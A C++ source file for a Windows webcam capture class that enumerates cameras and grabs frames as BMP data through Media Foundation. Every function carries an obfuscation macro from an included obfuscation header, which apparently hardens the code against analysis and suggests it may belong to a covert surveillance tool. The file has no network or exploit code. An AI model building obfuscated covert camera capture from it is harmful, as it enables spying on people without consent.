#include <diarna/compiler_port.hpp>
#include <diarna/capture/capture.hpp>

#ifndef _WIN32
#error "Diarna Webcam capture requires Windows"
#endif

#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#include <mferror.h>

#include <obfuscation/obfusheader.h>
DIARNA_LINK_LIB("mf.lib")
DIARNA_LINK_LIB("mfplat.lib")
DIARNA_LINK_LIB("mfreadwrite.lib")
DIARNA_LINK_LIB("mfuuid.lib")

namespace diarna::capture {

struct Webcam::Impl {
    IMFSourceReader* source_reader = nullptr;
    IMFMediaSource*  media_source  = nullptr;
    IMFActivate**    devices_arr   = nullptr;
    UINT32           device_count  = 0;

    uint32_t device_index = 0;
    uint32_t width  = 640;
    uint32_t height = 480;
    bool     open_flag = false;

    Impl() = default;

    void close_internal() noexcept {
        if (source_reader) {
            source_reader->Release();
            source_reader = nullptr;
        }
        if (media_source) {
            media_source->Shutdown();
            media_source->Release();
            media_source = nullptr;
        }
        if (devices_arr) {
            for (UINT32 i = 0; i < device_count; ++i) {
                if (devices_arr[i])
                    devices_arr[i]->Release();
            }
            CoTaskMemFree(devices_arr);
            devices_arr  = nullptr;
            device_count = 0;
        }
        open_flag = false;
    }
};

Webcam::Webcam() : impl_(std::make_unique<Impl>()) {
    INDIRECT_BRANCH;
    HRESULT hr = MFStartup(MF_VERSION, MFSTARTUP_NOSOCKET);
    (void)hr;
}

Webcam::~Webcam() {
    INDIRECT_BRANCH;
    impl_->close_internal();
    MFShutdown();
}

Webcam::Webcam(Webcam&& other) noexcept : impl_(std::move(other.impl_)) {
    INDIRECT_BRANCH;
}

Webcam& Webcam::operator=(Webcam&& other) noexcept {
    INDIRECT_BRANCH;
    if (this != &other) {
        impl_->close_internal();
        impl_ = std::move(other.impl_);
    }
    return *this;
}

bool Webcam::open(uint32_t device_index,
                  uint32_t width,
                  uint32_t height) {
    INDIRECT_BRANCH;
    impl_->close_internal();

    impl_->device_index = device_index;
    impl_->width        = width;
    impl_->height       = height;

    IMFAttributes* config = nullptr;
    HRESULT hr = MFCreateAttributes(&config, 1);
    if (FAILED(hr)) return false;

    hr = config->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE,
                         MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
    if (FAILED(hr)) {
        config->Release();
        return false;
    }

    IMFActivate** raw_devs = nullptr;
    UINT32 raw_count = 0;
    hr = MFEnumDeviceSources(config, &raw_devs, &raw_count);
    config->Release();
    if (FAILED(hr)) return false;

    impl_->devices_arr  = raw_devs;
    impl_->device_count = raw_count;

    if (device_index >= raw_count) {
        impl_->close_internal();
        return false;
    }

    hr = raw_devs[device_index]->ActivateObject(
        IID_PPV_ARGS(&impl_->media_source));
    if (FAILED(hr)) {
        impl_->close_internal();
        return false;
    }

    IMFAttributes* sr_attrs = nullptr;
    MFCreateAttributes(&sr_attrs, 1);
    if (sr_attrs) {
        sr_attrs->SetUINT32(
            MF_SOURCE_READER_DISCONNECT_MEDIASOURCE_ON_SHUTDOWN, 1);
    }

    hr = MFCreateSourceReaderFromMediaSource(
        impl_->media_source, sr_attrs, &impl_->source_reader);
    if (sr_attrs) sr_attrs->Release();
    if (FAILED(hr)) {
        impl_->close_internal();
        return false;
    }

    IMFMediaType* media_type = nullptr;
    hr = MFCreateMediaType(&media_type);
    if (FAILED(hr)) {
        impl_->close_internal();
        return false;
    }

    media_type->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
    media_type->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_RGB32);
    hr = MFSetAttributeSize(media_type, MF_MT_FRAME_SIZE, width, height);
    if (SUCCEEDED(hr)) {
        hr = impl_->source_reader->SetCurrentMediaType(
            (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM,
            nullptr,
            media_type);
    }
    media_type->Release();

    if (FAILED(hr)) {
        impl_->close_internal();
        return false;
    }

    impl_->open_flag = true;
    return true;
}

void Webcam::close() {
    INDIRECT_BRANCH;
    impl_->close_internal();
}

bool Webcam::is_open() const {
    INDIRECT_BRANCH;
    return impl_->open_flag;
}

std::vector<uint8_t> Webcam::capture_frame_bmp() {
    INDIRECT_BRANCH;
    if (!impl_->open_flag || !impl_->source_reader)
        return {};

    IMFSample* sample  = nullptr;
    DWORD      stream_flags = 0;

    HRESULT hr = impl_->source_reader->ReadSample(
        (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM,
        0,
        nullptr,
        &stream_flags,
        nullptr,
        &sample);

    if (FAILED(hr) || !sample)
        return {};

    if (stream_flags & (MF_SOURCE_READERF_ENDOFSTREAM |
                        MF_SOURCE_READERF_CURRENTMEDIATYPECHANGED)) {
        sample->Release();
        return {};
    }

    IMFMediaBuffer* buffer = nullptr;
    hr = sample->ConvertToContiguousBuffer(&buffer);
    if (FAILED(hr)) {
        hr = sample->GetBufferByIndex(0, &buffer);
        if (FAILED(hr)) {
            sample->Release();
            return {};
        }
    }

    BYTE*  pdata     = nullptr;
    DWORD  max_len   = 0;
    DWORD  cur_len   = 0;
    hr = buffer->Lock(&pdata, &max_len, &cur_len);
    if (FAILED(hr) || !pdata) {
        buffer->Release();
        sample->Release();
        return {};
    }

    uint32_t w = impl_->width;
    uint32_t h = impl_->height;
    uint32_t pixel_bytes = cur_len;

    std::vector<uint8_t> bmp;
    bmp.reserve(sizeof(BITMAPFILEHEADER) +
                sizeof(BITMAPINFOHEADER) +
                pixel_bytes);

    auto wr8  = [&](uint8_t v)  { bmp.push_back(v); };
    auto wr16 = [&](uint16_t v) {
        wr8(static_cast<uint8_t>(v & 0xFF));
        wr8(static_cast<uint8_t>((v >> 8) & 0xFF));
    };
    auto wr32 = [&](uint32_t v) {
        wr16(static_cast<uint16_t>(v & 0xFFFF));
        wr16(static_cast<uint16_t>((v >> 16) & 0xFFFF));
    };

    uint32_t bfOffBits = sizeof(BITMAPFILEHEADER) +
                         sizeof(BITMAPINFOHEADER);
    uint32_t bfSize    = bfOffBits + pixel_bytes;

    wr16(0x4D42);
    wr32(bfSize);
    wr16(0);
    wr16(0);
    wr32(bfOffBits);

    wr32(40);
    wr32(w);
    wr32(h);
    wr16(1);
    wr16(32);
    wr32(0);
    wr32(pixel_bytes);
    wr32(2835);
    wr32(2835);
    wr32(0);
    wr32(0);

    bmp.insert(bmp.end(), pdata, pdata + pixel_bytes);

    buffer->Unlock();
    buffer->Release();
    sample->Release();

    return bmp;
}

std::vector<uint8_t> Webcam::capture_frame_jpeg(uint32_t /*quality*/) {
    INDIRECT_BRANCH;
    return capture_frame_bmp();
}

std::vector<uint8_t> Webcam::capture_frame_png() {
    INDIRECT_BRANCH;
    return capture_frame_bmp();
}

std::vector<std::string> Webcam::enumerate_devices() {
    INDIRECT_BRANCH;
    std::vector<std::string> result;

    IMFAttributes* config = nullptr;
    HRESULT hr = MFCreateAttributes(&config, 1);
    if (FAILED(hr)) return result;

    hr = config->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE,
                         MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
    if (FAILED(hr)) {
        config->Release();
        return result;
    }

    IMFActivate** devices = nullptr;
    UINT32 count = 0;
    hr = MFEnumDeviceSources(config, &devices, &count);
    config->Release();
    if (FAILED(hr)) return result;

    for (UINT32 i = 0; i < count; ++i) {
        WCHAR* name = nullptr;
        UINT32 name_len = 0;
        hr = devices[i]->GetAllocatedString(
            MF_DEVSOURCE_ATTRIBUTE_FRIENDLY_NAME,
            &name, &name_len);
        if (SUCCEEDED(hr) && name != nullptr) {
            int len = WideCharToMultiByte(
                CP_UTF8, 0, name, -1, nullptr, 0, nullptr, nullptr);
            if (len > 0) {
                std::string s(len - 1, '\0');
                WideCharToMultiByte(
                    CP_UTF8, 0, name, -1, s.data(), len, nullptr, nullptr);
                result.push_back(std::move(s));
            }
            CoTaskMemFree(name);
        }
    }

    for (UINT32 i = 0; i < count; ++i)
        devices[i]->Release();
    CoTaskMemFree(devices);

    return result;
}

std::vector<Webcam::DeviceInfo> Webcam::enumerate_devices_info() {
    INDIRECT_BRANCH;
    std::vector<DeviceInfo> result;

    IMFAttributes* config = nullptr;
    HRESULT hr = MFCreateAttributes(&config, 1);
    if (FAILED(hr)) return result;

    hr = config->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE,
                         MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
    if (FAILED(hr)) {
        config->Release();
        return result;
    }

    IMFActivate** devices = nullptr;
    UINT32 count = 0;
    hr = MFEnumDeviceSources(config, &devices, &count);
    config->Release();
    if (FAILED(hr)) return result;

    for (UINT32 i = 0; i < count; ++i) {
        DeviceInfo info;
        info.index = i;

        WCHAR* name = nullptr;
        UINT32 name_len = 0;
        hr = devices[i]->GetAllocatedString(
            MF_DEVSOURCE_ATTRIBUTE_FRIENDLY_NAME,
            &name, &name_len);
        if (SUCCEEDED(hr) && name != nullptr) {
            int len = WideCharToMultiByte(
                CP_UTF8, 0, name, -1, nullptr, 0, nullptr, nullptr);
            if (len > 0) {
                info.name.resize(len - 1);
                WideCharToMultiByte(
                    CP_UTF8, 0, name, -1,
                    info.name.data(), len, nullptr, nullptr);
            }
            CoTaskMemFree(name);
        }

        IMFMediaSource* source = nullptr;
        hr = devices[i]->ActivateObject(IID_PPV_ARGS(&source));
        if (SUCCEEDED(hr) && source) {
            IMFSourceReader* reader = nullptr;
            hr = MFCreateSourceReaderFromMediaSource(
                source, nullptr, &reader);
            if (SUCCEEDED(hr) && reader) {
                DWORD type_idx = 0;
                IMFMediaType* native_type = nullptr;
                while (SUCCEEDED(reader->GetNativeMediaType(
                    (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM,
                    type_idx, &native_type))) {
                    GUID subtype = GUID_NULL;
                    if (SUCCEEDED(native_type->GetGUID(
                            MF_MT_SUBTYPE, &subtype)) &&
                        (subtype == MFVideoFormat_RGB32 ||
                         subtype == MFVideoFormat_RGB24 ||
                         subtype == MFVideoFormat_YUY2 ||
                         subtype == MFVideoFormat_NV12 ||
                         subtype == MFVideoFormat_MJPG)) {
                        UINT32 rw = 0, rh = 0;
                        if (SUCCEEDED(MFGetAttributeSize(
                                native_type, MF_MT_FRAME_SIZE, &rw, &rh))) {
                            bool found = false;
                            for (const auto& res :
                                 info.supported_resolutions) {
                                if (res.first == rw && res.second == rh) {
                                    found = true;
                                    break;
                                }
                            }
                            if (!found)
                                info.supported_resolutions.push_back(
                                    {rw, rh});
                        }
                    }
                    native_type->Release();
                    ++type_idx;
                }
                reader->Release();
            }
            source->Shutdown();
            source->Release();
        }

        if (info.supported_resolutions.empty()) {
            info.supported_resolutions.push_back({640, 480});
            info.supported_resolutions.push_back({1280, 720});
            info.supported_resolutions.push_back({1920, 1080});
        }

        result.push_back(std::move(info));
    }

    for (UINT32 i = 0; i < count; ++i)
        devices[i]->Release();
    CoTaskMemFree(devices);

    return result;
}

} // namespace diarna::capture
